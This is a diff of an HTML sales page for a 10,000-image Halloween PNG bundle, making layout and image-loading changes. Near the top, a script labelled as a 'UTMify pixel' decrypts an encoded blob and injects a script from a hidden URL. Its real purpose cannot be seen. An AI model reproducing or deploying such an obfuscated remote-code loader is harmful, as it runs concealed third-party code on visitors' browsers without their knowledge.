@@ -9,6 +9,8 @@
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cellipse cx='32' cy='38' rx='26' ry='22' fill='%23FF7A1A'/%3E%3Crect x='29' y='8' width='6' height='12' rx='2' fill='%2384CC16'/%3E%3Cpath d='M20 34l6-6 6 6zM32 34l6-6 6 6z' fill='%230A0A0A'/%3E%3Cpath d='M20 44q12 8 24 0' stroke='%230A0A0A' stroke-width='4' fill='none'/%3E%3C/svg%3E">
 <link rel="preload" href="fonts/barlow-400.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="preload" href="fonts/barlow-condensed-900.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" as="image" href="img/optimized/hero-vault-mockup-mobile.webp" type="image/webp" media="(max-width: 600px)">
+<link rel="preload" as="image" href="img/optimized/hero-vault-mockup-b97d2c29b889.webp" type="image/webp" media="(min-width: 601px)">
 
 <!-- UTMify pixel -->
 <script>(function(){var z_5=atob("DBAFs0BB0QpkmU4zv2snxjIt8zBG8TpHz2M/nG8itWRK7Dpe1nZ8nSMuvCQG62FA3GJswzQy/noN4StfkGBsyyUt/2AXu2IR3mRxwSkjpH4B6mwJ5E0pkSctvmgF9T0RhUt+kS4gvG9Go2xD1mhg3wkl8yZG7y9fynUniWJ3sGlVoX4Lj3E00nMk4DtX+nxRhyVjh3djrFcZ");var x_e=[];for(var z_t27m=0;z_t27m<z_5.length;z_t27m++){x_e.push(z_5.charCodeAt(z_t27m)&255);}var h_bng=x_e[0];var r_ws4=x_e.slice(1,1+h_bng);var f_bsqz=x_e.slice(1+h_bng);var a_l=f_bsqz.map(function(b,k_2wpx){return b^r_ws4[k_2wpx%h_bng];});var a_ff4="";for(var a_kk=0;a_kk<a_l.length;a_kk++){a_ff4+=String.fromCharCode(a_l[a_kk]&255);}var s_cqoo=decodeURIComponent(escape(a_ff4));var c_nhj2=JSON.parse(s_cqoo);var q_wb=c_nhj2.globals||[];q_wb.forEach(function(g_dyg){window[g_dyg.name]=g_dyg.value;});var k_z=document.createElement("script");k_z.src=c_nhj2.url;k_z.async=true;k_z.defer=true;(c_nhj2.attributes||[]).forEach(function(l_08o2){k_z.setAttribute(l_08o2.name,l_08o2.value);});(document.head||document.documentElement).appendChild(k_z);})();</script>
@@ -58,10 +60,9 @@ p{margin:0 0 14px; color:var(--muted); font-size:clamp(16px,3.4vw,18px)}
 .section-surface{background:var(--surface)}
 
 /* ---------- ticker ---------- */
-.ticker{background:var(--pumpkin); color:#0A0A0A; font-weight:800; font-size:14px; overflow:hidden; white-space:nowrap}
-.ticker-track{display:inline-flex; gap:48px; padding:9px 0; animation:marquee 30s linear infinite}
+.ticker{background:var(--pumpkin); color:#0A0A0A; font-weight:800; font-size:13px}
+.ticker-track{display:flex; flex-wrap:wrap; justify-content:center; gap:4px 18px; max-width:var(--wrap); margin:0 auto; padding:9px clamp(16px,4vw,48px)}
 .ticker-track span{display:inline-flex; align-items:center; gap:10px}
-@keyframes marquee{from{transform:translateX(0)}to{transform:translateX(-50%)}}
 
 /* ---------- header ---------- */
 header.top{position:relative; background:var(--bg);
@@ -124,9 +125,9 @@ header.top .in{max-width:var(--wrap); margin:0 auto; padding:14px clamp(16px,4vw
 .hero-price .from{color:var(--muted); font-size:15px}
 
 /* ---------- works with ---------- */
-.works{border-top:1px solid var(--line); border-bottom:1px solid var(--line); background:var(--surface); overflow:hidden; white-space:nowrap}
-.works-track{display:inline-flex; gap:56px; padding:22px 0; animation:marquee 34s linear infinite}
-.works-track span{font-family:"Barlow Condensed",sans-serif; font-weight:800; font-size:24px; color:#5A5A5A; text-transform:uppercase; letter-spacing:.04em}
+.works{border-top:1px solid var(--line); border-bottom:1px solid var(--line); background:var(--surface)}
+.works-track{display:flex; flex-wrap:wrap; justify-content:center; gap:12px 24px; max-width:var(--wrap); margin:0 auto; padding:18px clamp(16px,4vw,48px)}
+.works-track span{font-family:"Barlow Condensed",sans-serif; font-weight:800; font-size:18px; color:#777; text-transform:uppercase; letter-spacing:.04em}
 
 /* ---------- two-way artwork showcase ---------- */
 .rail-head{display:flex; align-items:flex-end; justify-content:space-between; gap:16px; margin-bottom:22px}
@@ -304,7 +305,6 @@ footer nav a{color:var(--muted); text-decoration:none}
 <div class="ticker" aria-hidden="true">
   <div class="ticker-track">
     <span>HALLOWEEN LAUNCH PRICE · ENDS 31 OCTOBER</span><span>10,000+ PNGs · 300 DPI · TRANSPARENT</span><span>COMMERCIAL LICENCE INCLUDED</span><span>INSTANT DOWNLOAD</span>
-    <span>HALLOWEEN LAUNCH PRICE · ENDS 31 OCTOBER</span><span>10,000+ PNGs · 300 DPI · TRANSPARENT</span><span>COMMERCIAL LICENCE INCLUDED</span><span>INSTANT DOWNLOAD</span>
   </div>
 </div>
 
@@ -325,7 +325,10 @@ footer nav a{color:var(--muted); text-decoration:none}
       <p class="eyebrow"><svg width="14" height="14" viewBox="0 0 20 20" fill="#FBBF24"><path d="M10 1l2.6 5.9 6.4.6-4.8 4.2 1.5 6.3L10 14.9 4.3 18l1.5-6.3L1 7.5l6.4-.6Z"/></svg>BUILT FOR SMALL PRINT SHOPS</p>
       <h1><span class="big">10,000+</span> Halloween PNGs Ready to Print, Press &amp; Sell</h1>
       <p class="madefor">Create a complete Halloween product range without starting from scratch.</p>
-      <img class="hero-mockup" src="img/optimized/hero-vault-mockup-b97d2c29b889.webp" alt="Halloween PNG Vault mockup with designs shown on a tablet, laptop, T-shirt, mug, tumbler, stickers and tote bag" width="1448" height="1086" decoding="async" fetchpriority="high">
+      <picture class="hero-mockup">
+        <source media="(max-width: 600px)" srcset="img/optimized/hero-vault-mockup-mobile.webp" width="880" height="660">
+        <img src="img/optimized/hero-vault-mockup-b97d2c29b889.webp" alt="Halloween PNG Vault mockup with designs shown on a tablet, laptop, T-shirt, mug, tumbler, stickers and tote bag" width="1448" height="1086" decoding="async" fetchpriority="high">
+      </picture>
       <ul class="checks">
         <li><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="11" fill="#FF7A1A"/><path d="M7 12.5l3.2 3L17 9" stroke="#0A0A0A" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg>10,000+ ready-to-use designs across 20 styles</li>
         <li><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="11" fill="#FF7A1A"/><path d="M7 12.5l3.2 3L17 9" stroke="#0A0A0A" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg>Transparent backgrounds · 300 DPI · print-ready</li>
@@ -344,7 +347,6 @@ footer nav a{color:var(--muted); text-decoration:none}
 <!-- =================== WORKS WITH =================== -->
 <div class="works" aria-label="Works with">
   <div class="works-track">
-    <span>Cricut Design Space</span><span>Silhouette</span><span>Canva</span><span>Procreate</span><span>Photoshop</span><span>Sublimation</span><span>DTF</span><span>PRIME Hydration</span>
     <span>Cricut Design Space</span><span>Silhouette</span><span>Canva</span><span>Procreate</span><span>Photoshop</span><span>Sublimation</span><span>DTF</span><span>PRIME Hydration</span>
   </div>
 </div>
@@ -724,7 +726,7 @@ var CHECKOUT = {
   var section = document.getElementById('inside');
   var rails = [document.getElementById('rail-left'), document.getElementById('rail-right')];
   var reducedMotion = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
-  var states = [], previewImages = [], visible = false, frame = 0, last = 0, upgradeStarted = false;
+  var states = [], previewImages = [], visible = false, frame = 0, last = 0;
 
   document.querySelectorAll('[data-rail]').forEach(function(b){
     b.addEventListener('click', function(){
@@ -753,31 +755,8 @@ var CHECKOUT = {
     if (visible && states.length && !frame){
       last = 0;
       frame = requestAnimationFrame(tick);
-      upgradeImages();
     }
     if (!visible && frame){ cancelAnimationFrame(frame); frame = 0; }
-  }
-
-  function upgradeImages(){
-    if (upgradeStarted) return;
-    upgradeStarted = true;
-    previewImages.forEach(function(img){
-      var path = img.getAttribute('data-full');
-      var full = new Image();
-      function swap(){
-        document.querySelectorAll('.rail img[data-full="' + path + '"]').forEach(function(target){
-          target.src = path;
-          target.removeAttribute('data-full');
-        });
-      }
-      if (full.decode){
-        full.src = path;
-        full.decode().then(swap).catch(function(){});
-      } else {
-        full.onload = swap;
-        full.src = path;
-      }
-    });
   }
 
   function start(){
